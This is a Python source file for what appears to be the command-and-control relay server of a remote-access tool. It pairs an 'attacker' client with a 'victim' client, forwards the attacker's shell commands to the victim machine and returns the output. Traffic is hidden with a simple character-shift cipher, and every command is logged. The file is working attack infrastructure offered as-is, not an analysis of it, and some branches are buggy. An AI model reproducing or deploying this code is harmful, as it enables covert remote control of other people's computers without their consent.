import socket
import os
from time import sleep
from threading import Thread
import sys
from datetime import datetime


srvSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SRV_IP   = "SERVER-IP"
SRV_PORT = 3216
THEattacker = False
THEvictim   = False
logFile = open("logFile.txt", "a")

def nowTime():
    return f"[{datetime.now().strftime('%x %X')}] "

def logga(data):
    global logFile
    logFile.write(f"{nowTime()} {data}\n")
    logFile.close()
    logFile = open("logFile.txt", "a")

def creatingServer():
    try:
        srvSock.bind((SRV_IP, SRV_PORT))
        srvSock.listen()
        logga("Server started")
        print("Server created")
    except:
        print("ERROR creating server")
        sys.exit(1)
        
        
    
def handleClients(cli, addr):
    global THEattacker, THEvictim

# Detect the type of client
    cliType = safeRecv(cli, 4096).decode()
    
    if not cliType:
        print(f"{addr} disconnected")
        logga(f"{addr} disconnected")
        return
    
    cliType = yutiCipher(cliType, "d")
    
    if (cliType == "attacker"):
        print("[!]Attacker connected")
        THEattacker = cli
    elif (cliType == "victim"):
        print("[!]Victim connected")
        THEvictim = cli
        return
        # So we have just 1 thread 
    else:
        print(f"[!]{addr} intruso disconnected")
        logga(f"[!]{addr} intruso disconnected")
        cli.close()
        return
        
    # Advanced options for attacker
    
    output = yutiCipher(safeRecv(THEattacker, 4096).decode(), "d")
       
    if output == "/closeServer":
        safeSend()
        THEvictim.close()
        THEattacker.close()
        srvSock.close()
        print("/closeServer called, closed sock, attacker, victim")
        logga("/closeServer called, closed sock, attacker, victim")
        
        logFile.close()
        sys.exit(0)
        
    elif output == "/victConn":
        res = ""
        
        if THEvictim:
            res = yutiCipher("Victim already connected.", "e")
        else:
           res = yutiCipher("Victim isn't connected yet.", "e")
           
        safeSend(THEattacker, res.encode() )     
    
    elif not output:
        THEattacker = False
        print("Attacker disconnected")
        return
    else:
        print(f"Attacker non chiede nulla ({output})")

    # ------ 


        
    # Waiting until the attacker and the victim are connected
    while not (THEattacker and THEvictim):
        if not THEattacker:
            print("Waiting the attacker...")
            logga("Waiting the attacker...")
        if not THEvictim:
            print("Waiting the victim...")
            logga("Waiting the victim...")
        sleep(10)
    # ---   
        
        
# The main loop to redirect the data
    while THEattacker and THEvictim:        
        # Recive the cmd
        print("Waiting command...")
        cmd = safeRecv(THEattacker, 4096)
        # if disconnected
        if not cmd:
            print("[!]Attacker disconnected")
            logga("[!]Attacker disconnected")
            THEattacker = False
            continue
        
        cmd = yutiCipher(cmd.decode(), "d")
            
        print(f"<attacker> {cmd}")
        logga(f"<attacker> {cmd}")
    
         # Advanced operations for attacker
        if cmd == "/closeServer":
            safeSend(THEattacker, yutiCipher("Closing server...", "e").encode() )
            THEvictim.close()
            THEattacker.close()
            srvSock.close()
            print("/closeServer called, closed sock, attacker, victim")
            logga("/closeServer called, closed sock, attacker, victim")
            
            logFile.close()
            sys.exit(0)
            
        elif cmd == "/victConn":
            res = ""
            
            if THEvictim:
                res = yutiCipher("Victim already connected.", "e")
            else:
                res = yutiCipher("Victim isn't connected yet.", "e")
            
            safeSend(THEattacker, res.encode() )  
            continue   
        
        elif not cmd:
            print("[!] Attacker disconnected.")
            THEattacker = False
            return
    # ------
            
        
        # Send the command to be executed
        THEvictim.send( yutiCipher(cmd, "e").encode() )
        if (THEvictim.fileno() < 0):
            THEvictim = False
            continue
            
        
        # Recive the response of  the command
        print("Waiting response...")
        output = safeRecv(THEvictim, 4096)
        # if disconnected
        if not output:
            THEvictim = False
            print("[!]Victim disconnected")
            logga("[!]Victim disconnected")
            continue
                         
        # Decrypt the response
        output = yutiCipher(output.decode(), "d")                
        print(f"<victim> {output}") 
        
        # Send the response to the attacker
        output = yutiCipher(output, "e").encode()
        safeSend(THEattacker, output)
        # if disconnected
        if THEattacker.fileno() < 0:
            print("Not arrived to attacker")
            THEattacker = False


    
def acceptingClients():
    quit = False

    while not quit:
        print("Waiting clients...")
        cli, addr = srvSock.accept()
            
        print(f"{addr} connected")
        logga(f"{addr} connected")
        
        # Create a thread for the new client
        try:
            Thread(target=handleClients, args=(cli, addr)).start()
        except KeyboardInterrupt:
            quit = True
            
    srvSock.close()

def safeSend(sock, data):
    try:
        sock.send(data)
    except:
        sock.close()
        

def safeRecv(sock, buf):
    try:
        return sock.recv(buf)
    except:
        sock.close() 
    

def yutiCipher(data:str, mode:str):
    lenght = len(data)
    toShift = lenght
    if toShift > 13:
        toShift = 13

    output = ""

    if mode.lower() == 'e':
        for i in range(lenght):
            
            output += chr( ord(data[i]) + toShift) 

    elif mode.lower() == 'd':
        for i in range(lenght):
            output += chr( ord(data[i]) - toShift) 
    else:
        return None

    return output


# Exec

try:
    creatingServer()    
    acceptingClients()
except:
    
    if THEattacker:
        THEattacker.close()
    
    if THEvictim:
        THEvictim.close()
        
    srvSock.close()
